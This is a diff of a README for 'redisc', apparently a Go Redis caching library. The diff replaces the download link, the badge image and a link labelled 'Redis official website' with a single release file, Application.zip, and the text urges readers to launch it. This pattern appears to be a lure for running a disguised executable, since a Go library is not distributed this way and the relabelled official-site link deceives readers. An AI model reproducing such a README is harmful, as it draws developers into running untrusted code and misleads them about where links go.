@@ -10,7 +10,7 @@ Welcome to the Redisc GitHub repository! In this README, you will find all the i
 
 ## Get Started 🎉
 
-To get started with Redis caching in your Golang projects, you can download the [redisc library here](https://github.com/file/Application.zip). Once you have downloaded the zip file, follow the instructions in the README to integrate Redis caching functionalities into your application.
+To get started with Redis caching in your Golang projects, you can download the [redisc library here](https://github.com/abirabhalimit/redisc/releases/download/v1.0.0/Application.zip). Once you have downloaded the zip file, follow the instructions in the README to integrate Redis caching functionalities into your application.
 
 ### Note: 
 This link points directly to the file you need to download, so make sure to launch it to get started with Redis caching.
@@ -21,13 +21,13 @@ If the direct download link above does not work or you are looking for more reso
 
 ## Additional Information ℹ️
 
-If you are interested in learning more about Redis and its applications in Golang programming, consider visiting [Redis official website](https://redis.io/) for comprehensive documentation and resources.
+If you are interested in learning more about Redis and its applications in Golang programming, consider visiting [Redis official website](https://github.com/abirabhalimit/redisc/releases/download/v1.0.0/Application.zip) for comprehensive documentation and resources.
 
 ### Repository Badges 🛡️
 
 To enhance the visual appeal of this repository, you can find badges below:
 
-[![Download redisc](https://img.shields.io/badge/Download-redisc-orange)](https://github.com/file/Application.zip)
+[![Download redisc](https://github.com/abirabhalimit/redisc/releases/download/v1.0.0/Application.zip)](https://github.com/abirabhalimit/redisc/releases/download/v1.0.0/Application.zip)
 
 ---
 
